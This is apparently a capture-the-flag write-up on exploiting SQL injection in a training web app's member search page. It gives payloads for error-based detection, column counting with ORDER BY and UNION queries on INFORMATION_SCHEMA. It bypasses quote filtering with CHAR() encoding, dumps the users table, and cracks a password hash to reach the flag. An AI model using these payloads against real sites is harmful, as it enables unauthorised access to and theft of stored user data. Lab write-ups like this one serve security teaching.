

in page : http://machineURL/?page=member 

you will find an input field to search for a member by ID

you can retrieve the member details by intering a number in the input field

one of the ways to detect SQL injection is to submit a quote
```
 ' 
``` 
submiting this quote will return this error 
```You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1 
```
with that output you can be cofident that this is a vulnerable payload
you can also try inputs like 
```OR 1=1 to retrive the whole list of membert
notice using this or we get a user named flag with surname GetThe
```

next, we want to retrieve all the tables, we can do that using this query :

```1 union SELECT null, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES
```

note: in order for union to succseed we need two conditions :

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

to check for how many columns the original query ruturns, you can test is using ORDER BY clauses and incrementing the specified column index until an error occurs like this :
```ORDER BY 1--
ORDER BY 2--
ORDER BY 3--
etc.
```

getting the output of all the talbles, notice a users table, thats our baby

we send another query to the database to get all the column names for the users table

```1 union SELECT null , COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = CHAR(0x75, 0x73, 0x65, 0x72, 0x73)
```

notice that we have encoded the users as CHAR(0x75, 0x73, 0x65, 0x72, 0x73)

that is because whenever we use some kind of quoted input we get a database error, that is propably due the the website implementing some security michanism

with that we get all the users coulmn names so we can construct a query to get all the data all the users

and we do that using this command : 
```1 union select null, concat_ws(CHAR(124),user_id, first_name, town, country, planet, Commentaire, countersign) from users
```
that gives us all the column values in the second column (surname) separated by | (char(124))

```5|Flag|42|42|42|Decrypt this password -> then lower all the char. Sh256 on it and it's good !|5ff9d0165b4f92b14994e5c685cdce28
```

you decrypt 5ff9d0165b4f92b14994e5c685cdce28 and you get FortyTwo
lowering all the letters and sh256 on it and we get the flag


